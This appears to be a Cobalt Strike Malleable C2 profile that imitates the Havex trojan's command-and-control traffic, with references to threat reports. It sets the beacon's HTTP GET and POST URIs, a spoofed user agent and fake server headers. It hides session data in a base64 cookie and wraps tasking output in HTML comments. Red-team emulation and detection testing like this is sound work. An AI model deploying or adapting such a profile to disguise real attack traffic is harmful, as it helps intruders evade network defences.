# havex trojan C&C profile
# Actor: Energetic Bear / Crouching Yeti / Dragonfly
# 
# See:
# . http://www.symantec.com/connect/blogs/emerging-threat-dragonfly-energetic-bear-apt-group
# . https://securelist.com/files/2014/07/EB-YetiJuly2014-Public.pdf
# . http://pastebin.com/qCdMwtZ6
# . http://www.crowdstrike.com/sites/all/themes/crowdstrike2/css/imgs/platform/CrowdStrike_Global_Threat_Report_2013.pdf
#
# Author: @armitagehacker

set sleeptime "30000";

set useragent "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08";

http-get {
	set uri "/include/template/isx.php /wp06/wp-includes/po.php /wp08/wp-includes/dtcla.php";

	client {
		header "Referer" "http://www.google.com";
		header "Accept" "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
		header "Accept-Language" "en-us,en;q=0.5";

		# base64 encoded Cookie is not a havex indicator, but a place to stuff our data
		metadata {
			base64;
			header "Cookie";
		}
	}

	server {
		header "Server" "Apache/2.2.26 (Unix)";
		header "X-Powered-By" "PHP/5.3.28";
		header "Cache-Control" "no-cache";
		header "Content-Type" "text/html";
		header "Keep-Alive" "timeout=3, max=100";

		output {
			base64;
			prepend "<html><head><mega http-equiv='CACHE-CONTROL' content='NO-CACHE'></head><body>Sorry, no data corresponding your request.<!--havex";
			append "havex--></body></html>";
			print;
		}
	}
}

# define indicators for an HTTP POST
http-post {
	set uri "/modules/mod_search.php /blog/wp-includes/pomo/src.php /includes/phpmailer/class.pop3.php";

	client {
		header "Content-Type" "application/octet-stream";

		# transmit our sess id as /whatever.php?id=[identifier]
		id {
			parameter "id";
		}

		# post our output with no real changes
		output {
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Server" "Apache/2.2.26 (Unix)";
		header "X-Powered-By" "PHP/5.3.28";
		header "Cache-Control" "no-cache";
		header "Content-Type" "text/html";
		header "Keep-Alive" "timeout=3, max=100";

		# this will just print an empty string, meh...
		output {
			base64;
			prepend "<html><head><mega http-equiv='CACHE-CONTROL' content='NO-CACHE'></head><body>Sorry, no data corresponding your request.<!--havex";
			append "havex--></body></html>";
			print;
		}
	}
}
